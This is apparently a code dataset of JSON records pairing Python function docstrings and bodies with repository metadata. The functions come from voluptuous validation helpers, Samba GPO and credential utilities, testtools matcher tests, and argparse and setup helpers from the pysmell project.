{"docstring": "\"\"\"Validate an object.\n\nHas the same behavior as dictionary validator but work with object\nattributes.\n\nFor example:\n\n    >>> class Structure(object):\n    ...     def __init__(self, one=None, three=None):\n    ...         self.one = one\n    ...         self.three = three\n    ...\n    >>> validate = Schema(Object({'one': 'two', 'three': 'four'}, cls=Structure))\n    >>> with raises(MultipleInvalid, \"not a valid value for object value @ data['one']\"):\n    ...   validate(Structure(one='three'))\n\n\"\"\"\n", "func_signal": "def _compile_object(self, schema):\n", "code": "base_validate = self._compile_mapping(\n    schema, invalid_msg='for object value')\n\ndef validate_object(path, data):\n    if (schema.cls is not UNDEFINED\n            and not isinstance(data, schema.cls)):\n        raise Invalid('expected a {0!r}'.format(schema.cls), path)\n    iterable = _iterate_object(data)\n    iterable = ifilter(lambda item: item[1] is not None, iterable)\n    out = base_validate(path, iterable, {})\n    return type(data)(**out)\n\nreturn validate_object", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Assert that a value is false, in the Python sense.\n\n(see :func:`IsTrue` for more detail)\n\n>>> validate = Schema(IsFalse())\n>>> validate([])\n[]\n\"\"\"\n", "func_signal": "def IsFalse(v):\n", "code": "if v:\n    raise ValueError\nreturn v", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Validate a sequence type.\n\nThis is a sequence of valid values or validators tried in order.\n\n>>> validator = Schema(['one', 'two', int])\n>>> validator(['one'])\n['one']\n>>> with raises(MultipleInvalid, 'invalid list value @ data[0]'):\n...   validator([3.5])\n>>> validator([1])\n[1]\n\"\"\"\n", "func_signal": "def _compile_sequence(self, schema, seq_type):\n", "code": "_compiled = [self._compile(s) for s in schema]\nseq_type_name = seq_type.__name__\n\ndef validate_sequence(path, data):\n    if not isinstance(data, seq_type):\n        raise Invalid('expected a %s' % seq_type_name, path)\n\n    # Empty seq schema, allow any data.\n    if not schema:\n        return data\n\n    out = []\n    invalid = None\n    errors = []\n    index_path = UNDEFINED\n    for i, value in enumerate(data):\n        index_path = path + [i]\n        invalid = None\n        for validate in _compiled:\n            try:\n                out.append(validate(index_path, value))\n                break\n            except Invalid as e:\n                if len(e.path) > len(index_path):\n                    raise\n                invalid = e\n        else:\n            if len(invalid.path) <= len(index_path):\n                invalid = Invalid('invalid %s value' % seq_type_name, index_path)\n            errors.append(invalid)\n    if errors:\n        raise MultipleInvalid(errors)\n    return type(data)(out)\nreturn validate_sequence", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Validate data against this schema.\"\"\"\n", "func_signal": "def __call__(self, data):\n", "code": "try:\n    return self._compiled([], data)\nexcept MultipleInvalid:\n    raise\nexcept Invalid as e:\n    raise MultipleInvalid([e])\n# return self.validate([], self.schema, data)", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Regex substitution.\n\n>>> validate = Schema(All(Replace('you', 'I'),\n...                       Replace('hello', 'goodbye')))\n>>> validate('you say hello')\n'I say goodbye'\n\"\"\"\n", "func_signal": "def Replace(pattern, substitution, msg=None):\n", "code": "if isinstance(pattern, basestring):\n    pattern = re.compile(pattern)\n\ndef f(v):\n    return pattern.sub(substitution, v)\nreturn f", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Convenience decorator to allow functions to provide a message.\n\nSet a default message:\n\n    >>> @message('not an integer')\n    ... def isint(v):\n    ...   return int(v)\n\n    >>> validate = Schema(isint())\n    >>> with raises(MultipleInvalid, 'not an integer'):\n    ...   validate('a')\n\nThe message can be overridden on a per validator basis:\n\n    >>> validate = Schema(isint('bad'))\n    >>> with raises(MultipleInvalid, 'bad'):\n    ...   validate('a')\n\"\"\"\n", "func_signal": "def message(default=None):\n", "code": "def decorator(f):\n    @wraps(f)\n    def check(msg=None):\n        @wraps(f)\n        def wrapper(*args, **kwargs):\n            try:\n                return f(*args, **kwargs)\n            except ValueError:\n                raise Invalid(msg or default or 'invalid value')\n        return wrapper\n    return check\nreturn decorator", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Value must be a string that matches the regular expression.\n\n>>> validate = Schema(Match(r'^0x[A-F0-9]+$'))\n>>> validate('0x123EF4')\n'0x123EF4'\n>>> with raises(MultipleInvalid, \"does not match regular expression\"):\n...   validate('123EF4')\n\n>>> with raises(MultipleInvalid, 'expected string or buffer'):\n...   validate(123)\n\nPattern may also be a _compiled regular expression:\n\n>>> validate = Schema(Match(re.compile(r'0x[A-F0-9]+', re.I)))\n>>> validate('0x123ef4')\n'0x123ef4'\n\"\"\"\n", "func_signal": "def Match(pattern, msg=None):\n", "code": "if isinstance(pattern, basestring):\n    pattern = re.compile(pattern)\n\ndef f(v):\n    try:\n        match = pattern.match(v)\n    except TypeError:\n        raise Invalid(\"expected string or buffer\")\n    if not match:\n        raise Invalid(msg or 'does not match regular expression')\n    return v\nreturn f", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Validate that a value is in a collection.\"\"\"\n", "func_signal": "def In(container, msg=None):\n", "code": "@wraps(In)\ndef validator(value):\n    if not value in container:\n        raise Invalid(msg or 'value is not allowed')\n    return value\nreturn validator", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Limit a value to a range.\n\nEither min or max may be omitted.\nEither min or max can be excluded from the range of accepted values.\n\n:raises Invalid: If the value is outside the range.\n\n>>> s = Schema(Range(min=1, max=10, min_included=False))\n>>> s(5)\n5\n>>> s(10)\n10\n>>> with raises(MultipleInvalid, 'value must be at most 10'):\n...   s(20)\n>>> with raises(MultipleInvalid, 'value must be higher than 1'):\n...   s(1)\n\"\"\"\n", "func_signal": "def Range(min=None, max=None, min_included=True, max_included=True, msg=None):\n", "code": "@wraps(Range)\ndef f(v):\n    if min_included:\n        if min is not None and v < min:\n            raise Invalid(msg or 'value must be at least %s' % min)\n    else:\n        if min is not None and v <= min:\n            raise Invalid(msg or 'value must be higher than %s' % min)\n    if max_included:\n        if max is not None and v > max:\n            raise Invalid(msg or 'value must be at most %s' % max)\n    else:\n        if max is not None and v >= max:\n            raise Invalid(msg or 'value must be lower than %s' % max)\n    return v\nreturn f", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Create a new Schema.\n\n:param schema: Validation schema. See :module:`voluptuous` for details.\n:param required: Keys defined in the schema must be in the data.\n:param extra: Keys in the data need not have keys in the schema.\n\"\"\"\n", "func_signal": "def __init__(self, schema, required=False, extra=False):\n", "code": "self.schema = schema\nself.required = required\nself.extra = extra\nself._compiled = self._compile(schema)", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Convenience decorator to convert truth functions into validators.\n\n    >>> @truth\n    ... def isdir(v):\n    ...   return os.path.isdir(v)\n    >>> validate = Schema(isdir)\n    >>> validate('/')\n    '/'\n    >>> with raises(MultipleInvalid, 'not a valid value'):\n    ...   validate('/notavaliddir')\n\"\"\"\n", "func_signal": "def truth(f):\n", "code": "@wraps(f)\ndef check(v):\n    t = f(v)\n    if not t:\n        raise ValueError\n    return v\nreturn check", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Value must pass all validators.\n\nThe output of each validator is passed as input to the next.\n\n:param msg: Message to deliver to user if validation fails.\n:param kwargs: All other keyword arguments are passed to the sub-Schema constructors.\n\n>>> validate = Schema(All('10', Coerce(int)))\n>>> validate('10')\n10\n\"\"\"\n", "func_signal": "def All(*validators, **kwargs):\n", "code": "msg = kwargs.pop('msg', None)\nschemas = [Schema(val, **kwargs) for val in validators]\n\ndef f(v):\n    try:\n        for schema in schemas:\n            v = schema(v)\n    except Invalid as e:\n        raise e if msg is None else Invalid(msg)\n    return v\nreturn f", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "\"\"\"Clamp a value to a range.\n\nEither min or max may be omitted.\n\"\"\"\n", "func_signal": "def Clamp(min=None, max=None, msg=None):\n", "code": "@wraps(Clamp)\ndef f(v):\n    if min is not None and v < min:\n        v = min\n    if max is not None and v > max:\n        v = max\n    return v\nreturn f", "path": "saboteur\\voluptuous.py", "repo_name": "tomakehurst/saboteur", "stars": 379, "license": "apache-2.0", "language": "python", "size": 660}
{"docstring": "'''Construct the DN for gpo'''\n\n", "func_signal": "def get_gpo_dn(samdb, gpo):\n", "code": "dn = samdb.get_default_basedn()\ndn.add_child(ldb.Dn(samdb, \"CN=Policies,CN=System\"))\ndn.add_child(ldb.Dn(samdb, \"CN=%s\" % gpo))\nreturn dn", "path": "lib\\python2.7\\site-packages\\samba\\netcmd\\gpo.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "# Annotate.if_message returns an annotated version of the matcher if a\n# message is provided.\n", "func_signal": "def test_if_message_given_message(self):\n", "code": "matcher = Equals(1)\nexpected = Annotate('foo', matcher)\nannotated = Annotate.if_message('foo', matcher)\nself.assertThat(\n    annotated,\n    MatchesStructure.fromExample(expected, 'annotation', 'matcher'))", "path": "lib\\python2.7\\site-packages\\samba\\external\\testtools\\tests\\test_matchers.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "# Annotate.if_message returns the given matcher if there is no\n# message.\n", "func_signal": "def test_if_message_no_message(self):\n", "code": "matcher = Equals(1)\nnot_annotated = Annotate.if_message('', matcher)\nself.assertIs(matcher, not_annotated)", "path": "lib\\python2.7\\site-packages\\samba\\external\\testtools\\tests\\test_matchers.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "'''Encode an array of dn and options into gPLink string'''\n", "func_signal": "def encode_gplink(gplist):\n", "code": "ret = ''\nfor g in gplist:\n    ret += \"[LDAP://%s;%d]\" % (g['dn'], g['options'])\nreturn ret", "path": "lib\\python2.7\\site-packages\\samba\\netcmd\\gpo.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "# When assertThat is given matchees or matchers that contain non-ASCII\n# unicode strings, we can still provide a meaningful error.\n", "func_signal": "def test_verbose_unicode(self):\n", "code": "matchee = _u('\\xa7')\nmatcher = Equals(_u('a'))\nmismatch = matcher.match(matchee)\nexpected = (\n    'Match failed. Matchee: %s\\n'\n    'Matcher: %s\\n'\n    'Difference: %s\\n' % (\n        text_repr(matchee),\n        matcher,\n        mismatch.describe(),\n        ))\ne = MismatchError(matchee, matcher, mismatch, True)\nif str_is_unicode:\n    actual = str(e)\nelse:\n    actual = unicode(e)\n    # Using str() should still work, and return ascii only\n    self.assertEqual(\n        expected.replace(matchee, matchee.encode(\"unicode-escape\")),\n        str(e).decode(\"ascii\"))\nself.assertEqual(expected, actual)", "path": "lib\\python2.7\\site-packages\\samba\\external\\testtools\\tests\\test_matchers.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "# [(expected, matchee, matcher), ...]\n", "func_signal": "def test_describe_difference(self):\n", "code": "examples = self.describe_examples\nfor difference, matchee, matcher in examples:\n    mismatch = matcher.match(matchee)\n    self.assertEqual(difference, mismatch.describe())", "path": "lib\\python2.7\\site-packages\\samba\\external\\testtools\\tests\\test_matchers.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "'''return gplink options string'''\n", "func_signal": "def gplink_options_string(value):\n", "code": "options = policy.get_gplink_options(value)\nif not options:\n    ret = 'NONE'\nelse:\n    ret = ' '.join(options)\nreturn ret", "path": "lib\\python2.7\\site-packages\\samba\\netcmd\\gpo.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "\"\"\"Obtain the credentials set on the command-line.\n\n:param lp: Loadparm object to use.\n:return: Credentials object\n\"\"\"\n", "func_signal": "def get_credentials(self, lp, fallback_machine=False):\n", "code": "self.creds.guess(lp)\nif self.no_pass:\n    self.creds.set_cmdline_callbacks()\n\n# possibly fallback to using the machine account, if we have\n# access to the secrets db\nif fallback_machine and not self.creds.authentication_requested():\n    try:\n        self.creds.set_machine_account(lp)\n    except Exception:\n        pass\n\nreturn self.creds", "path": "lib\\python2.7\\site-packages\\samba\\getopt.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "'''parse a gPLink into an array of dn and options'''\n", "func_signal": "def parse_gplink(gplink):\n", "code": "ret = []\na = gplink.split(']')\nfor g in a:\n    if not g:\n        continue\n    d = g.split(';')\n    if len(d) != 2 or not d[0].startswith(\"[LDAP://\"):\n        raise RuntimeError(\"Badly formed gPLink '%s'\" % g)\n    ret.append({ 'dn' : d[0][8:], 'options' : int(d[1])})\nreturn ret", "path": "lib\\python2.7\\site-packages\\samba\\netcmd\\gpo.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "# [(expected, object to __str__)].\n", "func_signal": "def test__str__(self):\n", "code": "examples = self.str_examples\nfor expected, matcher in examples:\n    self.assertThat(matcher, DocTestMatches(expected))", "path": "lib\\python2.7\\site-packages\\samba\\external\\testtools\\tests\\test_matchers.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "# MismatchError is an AssertionError, so that most of the time, it\n# looks like a test failure, rather than an error.\n", "func_signal": "def test_is_assertion_error(self):\n", "code": "def raise_mismatch_error():\n    raise MismatchError(2, Equals(3), Equals(3).match(2))\nself.assertRaises(AssertionError, raise_mismatch_error)", "path": "lib\\python2.7\\site-packages\\samba\\external\\testtools\\tests\\test_matchers.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "\"\"\"Return loadparm object with data specified on the command line.\"\"\"\n", "func_signal": "def get_loadparm(self):\n", "code": "if self._configfile is not None:\n    self._lp.load(self._configfile)\nelif os.getenv(\"SMB_CONF_PATH\") is not None:\n    self._lp.load(os.getenv(\"SMB_CONF_PATH\"))\nelse:\n    self._lp.load_default()\nreturn self._lp", "path": "lib\\python2.7\\site-packages\\samba\\getopt.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "'''return gpo flags string'''\n", "func_signal": "def gpo_flags_string(value):\n", "code": "flags = policy.get_gpo_flags(value)\nif not flags:\n    ret = 'NONE'\nelse:\n    ret = ' '.join(flags)\nreturn ret", "path": "lib\\python2.7\\site-packages\\samba\\netcmd\\gpo.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "# The mismatch object must provide get_details, which must return a\n# dictionary mapping names to Content objects.\n", "func_signal": "def test_mismatch_details(self):\n", "code": "examples = self.describe_examples\nfor difference, matchee, matcher in examples:\n    mismatch = matcher.match(matchee)\n    details = mismatch.get_details()\n    self.assertEqual(dict(details), details)", "path": "lib\\python2.7\\site-packages\\samba\\external\\testtools\\tests\\test_matchers.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "'''Parse UNC string into a hostname, a service, and a filepath'''\n", "func_signal": "def parse_unc(unc):\n", "code": "if unc.startswith('\\\\\\\\') and unc.startswith('//'):\n    raise ValueError(\"UNC doesn't start with \\\\\\\\ or //\")\ntmp = unc[2:].split('/', 2)\nif len(tmp) == 3:\n    return tmp\ntmp = unc[2:].split('\\\\', 2)\nif len(tmp) == 3:\n    return tmp\nraise ValueError(\"Invalid UNC string: %s\" % unc)", "path": "lib\\python2.7\\site-packages\\samba\\netcmd\\gpo.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "# When KeyboardInterrupt is matched, it is swallowed.\n", "func_signal": "def test_KeyboardInterrupt_matched(self):\n", "code": "matcher = Raises(MatchesException(KeyboardInterrupt))\nself.assertThat(self.raiser, matcher)", "path": "lib\\python2.7\\site-packages\\samba\\external\\testtools\\tests\\test_matchers.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "'''get an attribute from a ldap msg with a default'''\n", "func_signal": "def attr_default(msg, attrname, default):\n", "code": "if attrname in msg:\n    return msg[attrname][0]\nreturn default", "path": "lib\\python2.7\\site-packages\\samba\\netcmd\\gpo.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "\"\"\"Obtain the credentials set on the command-line.\n\n:param lp: Loadparm object to use.\n:param guess: Try guess Credentials from environment\n:return: Credentials object\n\"\"\"\n", "func_signal": "def get_credentials2(self, lp, guess=True):\n", "code": "if guess:\n    self.creds2.guess(lp)\nelif not self.creds2.get_username():\n    self.creds2.set_anonymous()\n\nif self.no_pass2:\n    self.creds2.set_cmdline_callbacks()\nreturn self.creds2", "path": "lib\\python2.7\\site-packages\\samba\\getopt.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "\"\"\"Import a LDIF a file into a LDB handle, optionally substituting\nvariables.\n\n:note: Either all LDIF data will be added or none (using transactions).\n\n:param ldb: LDB file to import into.\n:param ldif_path: Path to the LDIF file.\n:param subst_vars: Dictionary with substitution variables.\n\"\"\"\n", "func_signal": "def setup_ldb(ldb, ldif_path, subst_vars):\n", "code": "assert ldb is not None\nldb.transaction_start()\ntry:\n    setup_add_ldif(ldb, ldif_path, subst_vars)\nexcept:\n    ldb.transaction_cancel()\n    raise\nelse:\n    ldb.transaction_commit()", "path": "lib\\python2.7\\site-packages\\samba\\provision\\common.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "# If the raised exception isn't matched, and it is not a subclass of\n# Exception, it is propogated.\n", "func_signal": "def test_KeyboardInterrupt_match_Exception_propogates(self):\n", "code": "match_keyb = Raises(MatchesException(KeyboardInterrupt))\ndef raise_keyb_from_match():\n    if sys.version_info > (2, 5):\n        matcher = Raises(MatchesException(Exception))\n    else:\n        # On Python 2.4 KeyboardInterrupt is a StandardError subclass\n        # but should propogate from less generic exception matchers\n        matcher = Raises(MatchesException(EnvironmentError))\n    matcher.match(self.raiser)\nself.assertThat(raise_keyb_from_match, match_keyb)", "path": "lib\\python2.7\\site-packages\\samba\\external\\testtools\\tests\\test_matchers.py", "repo_name": "byt3bl33d3r/pth-toolkit", "stars": 499, "license": "bsd-2-clause", "language": "python", "size": 35720}
{"docstring": "# set prog from the existing prefix\n", "func_signal": "def add_parser(self, name, **kwargs):\n", "code": "if kwargs.get('prog') is None:\n    kwargs['prog'] = '%s %s' % (self._prog_prefix, name)\n\n# create a pseudo-action to hold the choice help\nif 'help' in kwargs:\n    help = kwargs.pop('help')\n    choice_action = self._ChoicesPseudoAction(name, help)\n    self._choices_actions.append(choice_action)\n\n# create the parser and add it to the map\nparser = self._parser_class(**kwargs)\nself._name_parser_map[name] = parser\nreturn parser", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# remove all conflicting options\n", "func_signal": "def _handle_conflict_resolve(self, action, conflicting_actions):\n", "code": "        for option_string, action in conflicting_actions:\n    # remove the conflicting option\n            action.option_strings.remove(option_string)\n            self._option_string_actions.pop(option_string, None)\n    # if the option now has no option string, remove it from the\n            # container holding it\n            if not action.option_strings:\n                action.container._remove_action(action)", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# find group indices and identify actions in groups\n", "func_signal": "def _format_actions_usage(self, actions, groups):\n", "code": "group_actions = set()\ninserts = {}\nfor group in groups:\n    start = actions.index(group._group_actions[0])\n    if start != -1:\n        end = start + len(group._group_actions)\n        if actions[start:end] == group._group_actions:\n            for action in group._group_actions:\n                group_actions.add(action)\n            if not group.required:\n                inserts[start] = '['\n                inserts[end] = ']'\n            else:\n                inserts[start] = '('\n                inserts[end] = ')'\n            for i in xrange(start + 1, end):\n                inserts[i] = '|'\n\n# collect all actions format strings\nparts = []\nfor i, action in enumerate(actions):\n\n    # suppressed arguments are marked with None\n    # remove | separators for suppressed arguments\n    if action.help is SUPPRESS:\n        parts.append(None)\n        if inserts.get(i) == '|':\n            inserts.pop(i)\n        elif inserts.get(i + 1) == '|':\n            inserts.pop(i + 1)\n\n    # produce all arg strings\n    elif not action.option_strings:\n        part = self._format_args(action, action.dest)\n\n        # if it's in a group, strip the outer []\n        if action in group_actions:\n            if part[0] == '[' and part[-1] == ']':\n                part = part[1:-1]\n\n        # add the action string to the list\n        parts.append(part)\n\n    # produce the first way to invoke the option in brackets\n    else:\n        option_string = action.option_strings[0]\n\n        # if the Optional doesn't take a value, format is:\n        #    -s or --long\n        if action.nargs == 0:\n            part = '%s' % option_string\n\n        # if the Optional takes a value, format is:\n        #    -s ARGS or --long ARGS\n        else:\n            default = action.dest.upper()\n            args_string = self._format_args(action, default)\n            part = '%s %s' % (option_string, args_string)\n\n        # make it look optional if it's not required or in a group\n        if not action.required and action not in group_actions:\n            part = '[%s]' % part\n\n        # add the action string to the list\n        parts.append(part)\n\n# insert things at the necessary indices\nfor i in sorted(inserts, reverse=True):\n    parts[i:i] = [inserts[i]]\n\n# join all the action items with spaces\ntext = ' '.join(item for item in parts if item is not None)\n\n# clean up separators for mutually exclusive groups\nopen = r'[\\[(]'\nclose = r'[\\])]'\ntext = _re.sub(r'(%s) ' % open, r'\\1', text)\ntext = _re.sub(r' (%s)' % close, r'\\1', text)\ntext = _re.sub(r'%s *%s' % (open, close), r'', text)\ntext = _re.sub(r'\\(([^|]*)\\)', r'\\1', text)\ntext = text.strip()\n\n# return the text\nreturn text", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# converted value must be one of the choices (if specified)\n", "func_signal": "def _check_value(self, action, value):\n", "code": "if action.choices is not None and value not in action.choices:\n    tup = value, ', '.join(map(repr, action.choices))\n    msg = _('invalid choice: %r (choose from %s)') % tup\n    raise ArgumentError(action, msg)", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# format the indented section\n", "func_signal": "def format_help(self):\n", "code": "if self.parent is not None:\n    self.formatter._indent()\njoin = self.formatter._join_parts\nfor func, args in self.items:\n    func(*args)\nitem_help = join(func(*args) for func, args in self.items)\nif self.parent is not None:\n    self.formatter._dedent()\n\n# return nothing if the section was empty\nif not item_help:\n    return ''\n\n# add the heading if the section was non-empty\nif self.heading is not SUPPRESS and self.heading is not None:\n    current_indent = self.formatter._current_indent\n    heading = '%*s%s:\\n' % (current_indent, '', self.heading)\nelse:\n    heading = ''\n\n# join the section-initial newline, the heading and the help\nreturn join(['\\n', heading, item_help, '\\n'])", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# determine the required width and the entry label\n", "func_signal": "def _format_action(self, action):\n", "code": "help_position = min(self._action_max_length + 2,\n                    self._max_help_position)\nhelp_width = self._width - help_position\naction_width = help_position - self._current_indent - 2\naction_header = self._format_action_invocation(action)\n\n# ho nelp; start on same line and add a final newline\nif not action.help:\n    tup = self._current_indent, '', action_header\n    action_header = '%*s%s\\n' % tup\n\n# short action name; start on the same line and pad two spaces\nelif len(action_header) <= action_width:\n    tup = self._current_indent, '', action_width, action_header\n    action_header = '%*s%-*s  ' % tup\n    indent_first = 0\n\n# long action name; start on the next line\nelse:\n    tup = self._current_indent, '', action_header\n    action_header = '%*s%s\\n' % tup\n    indent_first = help_position\n\n# collect the pieces of the action help\nparts = [action_header]\n\n# if there was help for the action, add lines of help text\nif action.help:\n    help_text = self._expand_help(action)\n    help_lines = self._split_lines(help_text, help_width)\n    parts.append('%*s%s\\n' % (indent_first, '', help_lines[0]))\n    for line in help_lines[1:]:\n        parts.append('%*s%s\\n' % (help_position, '', line))\n\n# or add a newline if the description doesn't end with one\nelif not action_header.endswith('\\n'):\n    parts.append('\\n')\n\n# if there are any sub-actions, add their help as well\nfor subaction in self._iter_indented_subactions(action):\n    parts.append(self._format_action(subaction))\n\n# return a single string\nreturn self._join_parts(parts)", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "\"\"\"Update our built-in md5 registry\"\"\"\n\n", "func_signal": "def update_md5(filenames):\n", "code": "import re\n\nfor name in filenames:\n    base = os.path.basename(name)\n    f = open(name,'rb')\n    md5_data[base] = md5(f.read()).hexdigest()\n    f.close()\n\ndata = [\"    %r: %r,\\n\" % it for it in md5_data.items()]\ndata.sort()\nrepl = \"\".join(data)\n\nimport inspect\nsrcfile = inspect.getsourcefile(sys.modules[__name__])\nf = open(srcfile, 'rb'); src = f.read(); f.close()\n\nmatch = re.search(\"\\nmd5_data = {\\n([^}]+)}\", src)\nif not match:\n    print >>sys.stderr, \"Internal error!\"\n    sys.exit(2)\n\nsrc = src[:match.start(1)] + repl + src[match.end(1):]\nf = open(srcfile,'w')\nf.write(src)\nf.close()", "path": "ez_setup.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# the special argument \"-\" means sys.std{in,out}\n", "func_signal": "def __call__(self, string):\n", "code": "if string == '-':\n    if 'r' in self._mode:\n        return _sys.stdin\n    elif 'w' in self._mode:\n        return _sys.stdout\n    else:\n        msg = _('argument \"-\" with mode %r' % self._mode)\n        raise ValueError(msg)\n\n# all other arguments are used as file names\nif self._bufsize:\n    return open(string, self._mode, self._bufsize)\nelse:\n    return open(string, self._mode)", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# progressively shorten the actions list by slicing off the\n# final actions until we find a match\n", "func_signal": "def _match_arguments_partial(self, actions, arg_strings_pattern):\n", "code": "result = []\nfor i in xrange(len(actions), 0, -1):\n    actions_slice = actions[:i]\n    pattern = ''.join(self._get_nargs_pattern(action)\n                      for action in actions_slice)\n    match = _re.match(pattern, arg_strings_pattern)\n    if match is not None:\n        result.extend(len(string) for string in match.groups())\n        break\n\n# return the list of arg string counts\nreturn result", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# collect groups by titles\n", "func_signal": "def _add_container_actions(self, container):\n", "code": "title_group_map = {}\nfor group in self._action_groups:\n    if group.title in title_group_map:\n        msg = _('cannot merge actions - two groups are named %r')\n        raise ValueError(msg % (group.title))\n    title_group_map[group.title] = group\n\n# map each action to its group\ngroup_map = {}\nfor group in container._action_groups:\n\n    # if a group with the title exists, use that, otherwise\n    # create a new group matching the container's group\n    if group.title not in title_group_map:\n        title_group_map[group.title] = self.add_argument_group(\n            title=group.title,\n            description=group.description,\n            conflict_handler=group.conflict_handler)\n\n    # map the actions to their new group\n    for action in group._group_actions:\n        group_map[action] = title_group_map[group.title]\n\n# add all actions to this container or their group\nfor action in container._actions:\n    group_map.get(action, self)._add_action(action)", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "\"\"\"arguments: fullPath, origSource, lineNo, origCol, matcher\n\nWhen visiting the file at fullPath, with edited source origSource, find a list \nof possible completion strings for the symbol located at origCol on orgLineNo using \nmatching mode matcher\"\"\"\n", "func_signal": "def get_completions(fullPath, origSource, lineNo, origCol, matcher):\n", "code": "PYSMELLDICT = idehelper.findPYSMELLDICT(fullPath)\nif not PYSMELLDICT:\n    return\norigLine = origSource.splitlines()[lineNo - 1]\nbase = split(\"[,.\\-+/|\\[\\]]\", origLine[:origCol].strip())[-1]\noptions = idehelper.detectCompletionType(fullPath, origSource, lineNo, origCol, base, PYSMELLDICT)\ncompletions = [completion['word'] for completion in idehelper.findCompletions(base, PYSMELLDICT, options, matcher)]\ncompletions = list(_uniquify(completions))\nreturn completions", "path": "pysmell\\emacshelper.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
